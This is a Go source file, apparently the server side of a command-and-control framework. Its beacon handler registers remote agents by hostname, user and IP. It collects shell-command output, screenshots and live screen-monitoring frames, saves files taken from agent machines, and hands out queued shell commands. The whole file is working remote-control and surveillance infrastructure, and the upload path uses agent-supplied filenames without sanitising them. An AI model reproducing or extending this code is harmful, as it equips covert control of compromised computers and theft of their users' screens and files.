package server

import (
	"encoding/base64"
	"fmt"
	"log/slog"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/forgec2/forgec2/internal/db"
	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"gorm.io/gorm"
)

func (s *Server) handleBeacon(c *gin.Context) {
	var req struct {
		UUID    string            `json:"uuid"`
		Info    map[string]string `json:"info"`
		Results []struct {
			TaskID   uint   `json:"task_id"`
			Type     string `json:"type"`
			Output   string `json:"output"`
			Error    string `json:"error"`
			Encoding string `json:"encoding"`
			Filename string `json:"filename"`
			Size     int    `json:"size"`
			Path     string `json:"path"`
		} `json:"results"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid json"})
		return
	}

	if req.UUID == "" {
		req.UUID = uuid.New().String()
	}

	var agent db.Agent
	result := s.db.Where("id = ?", req.UUID).First(&agent)
	now := time.Now()

	if result.Error == gorm.ErrRecordNotFound {
		hostname := req.Info["hostname"]
		username := req.Info["username"]
		ip := req.Info["ip"]

		if req.Info["encoding"] == "base64" {
			if decoded, err := base64.StdEncoding.DecodeString(hostname); err == nil {
				hostname = string(decoded)
			}
			if decoded, err := base64.StdEncoding.DecodeString(username); err == nil {
				username = string(decoded)
			}
			if decoded, err := base64.StdEncoding.DecodeString(ip); err == nil {
				ip = string(decoded)
			}
		}

		agent = db.Agent{
			ID:       req.UUID,
			Hostname: hostname,
			Username: username,
			OS:       req.Info["os"],
			Arch:     req.Info["arch"],
			IP:       ip,
			LastSeen: now,
			Status:   "online",
		}
		s.db.Create(&agent)
		slog.Info("New agent registered", "id", agent.ID, "hostname", agent.Hostname, "ip", agent.IP)
		go s.broadcastAgentNotification(agent)
	} else {
		agent.LastSeen = now
		agent.Status = "online"
		s.db.Save(&agent)
	}

	for _, r := range req.Results {
		slog.Info("Processing task result", "task_id", r.TaskID, "type", r.Type, "has_output", r.Output != "", "has_error", r.Error != "", "error_message", r.Error)

		var task db.Task
		if err := s.db.First(&task, r.TaskID).Error; err == nil && strings.EqualFold(task.AgentID, req.UUID) {
			task.Status = "completed"
			if r.Error != "" {
				task.Status = "failed"
				task.Error = r.Error
			}
			task.UpdatedAt = now

			// For monitoring control tasks, do not retain them in DB at all
			if r.Type == "screen_stream_start" || r.Type == "screen_stream_stop" {
				task.Result = "processed"
				s.db.Save(&task)
				s.broadcastTaskUpdate(req.UUID, task)
				s.db.Delete(&task) // explicitly do not retain monitoring control tasks
				continue
			}

			if r.Type == "screenshot" && r.Output != "" {
				slog.Info("Processing screenshot result", "agent_uuid", req.UUID, "task_id", r.TaskID)

				if IsScreenMonitoring(req.UUID) {
					// Live monitoring: do not persist image data to DB or disk files at all
					task.Result = "[live screen monitoring - not retained]"
					s.BroadcastScreenshot(req.UUID, r.Output)
					slog.Info("Screen frame received (monitoring - not saved to file)", "agent", req.UUID)
				} else {
					if r.Encoding == "base64" && r.Output != "" {
						decoded, err := base64.StdEncoding.DecodeString(r.Output)
						if err == nil {
							task.Result = string(decoded)
						} else {
							task.Result = r.Output
						}
					} else {
						task.Result = r.Output
					}
					saveScreenshot(req.UUID, task.ID, r.Output)
				}
			} else {
				// non-screenshot: store result
				if r.Encoding == "base64" && r.Output != "" {
					decoded, err := base64.StdEncoding.DecodeString(r.Output)
					if err == nil {
						task.Result = string(decoded)
					} else {
						task.Result = r.Output
					}
				} else {
					task.Result = r.Output
				}
			}

			s.db.Save(&task)
			s.broadcastTaskUpdate(req.UUID, task)

			if r.Type == "upload" && r.Output != "" {
				uploadDir := filepath.Join("data", "uploads", req.UUID)
				os.MkdirAll(uploadDir, 0755)
				filename := r.Filename
				if filename == "" {
					filename = fmt.Sprintf("file_%d", task.ID)
				}
				filePath := filepath.Join(uploadDir, filename)
				decoded, err := base64.StdEncoding.DecodeString(r.Output)
				if err == nil {
					os.WriteFile(filePath, decoded, 0644)
					task.Result = fmt.Sprintf("文件已保存到服务器: %s (%d bytes)", filename, r.Size)
					s.db.Save(&task)
					slog.Info("File uploaded from agent", "agent", req.UUID, "file", filename, "size", r.Size)
				}
			}
		}
	}

	var pendingTasks []db.Task
	s.db.Where("LOWER(agent_id) = LOWER(?) AND status = ?", req.UUID, "pending").Order("created_at asc").Limit(BeaconTaskFetchLimit).Find(&pendingTasks)

	slog.Info("Beacon fetching pending tasks", "agent_uuid", req.UUID, "pending_count", len(pendingTasks))

	var allTasks []db.Task
	s.db.Where("agent_id = ?", req.UUID).Find(&allTasks)
	if len(allTasks) > 0 {
		slog.Info("Debug: Found tasks for agent", "agent_uuid", req.UUID, "total_tasks", len(allTasks))
		for _, t := range allTasks {
			slog.Debug("Task details", "task_id", t.ID, "type", t.Type, "status", t.Status)
		}
	}

	for i := range pendingTasks {
		pendingTasks[i].Status = "running"
		s.db.Save(&pendingTasks[i])
	}

	type TaskResp struct {
		ID      uint   `json:"id"`
		Type    string `json:"type"`
		Command string `json:"command"`
		Shell   string `json:"shell"`
		Path    string `json:"path,omitempty"`
		Data    string `json:"data,omitempty"`
	}
	respTasks := make([]TaskResp, len(pendingTasks))
	for i, t := range pendingTasks {
		respTasks[i] = TaskResp{
			ID:      t.ID,
			Type:    t.Type,
			Command: t.Command,
			Shell:   t.Shell,
			Path:    t.Path,
			Data:    t.Data,
		}
	}

	c.JSON(http.StatusOK, gin.H{"tasks": respTasks})
}

func saveScreenshot(agentID string, taskID uint, b64Data string) {
	if IsScreenMonitoring(agentID) {
		return // do not retain files during live screen monitoring
	}
	dir := filepath.Join("data/screenshots", agentID)
	os.MkdirAll(dir, 0755)
	data, err := base64.StdEncoding.DecodeString(b64Data)
	if err != nil {
		return
	}
	filename := fmt.Sprintf("screenshot_%d_%d.png", taskID, time.Now().Unix())
	_ = os.WriteFile(filepath.Join(dir, filename), data, 0644)
}

func (s *Server) handleServeScreenshot(c *gin.Context) {
	agentID := c.Param("agent_id")
	filename := c.Param("filename")
	if strings.Contains(filename, "..") || strings.Contains(agentID, "..") {
		c.String(http.StatusBadRequest, "invalid path")
		return
	}
	path := filepath.Join("data/screenshots", agentID, filename)
	c.File(path)
}
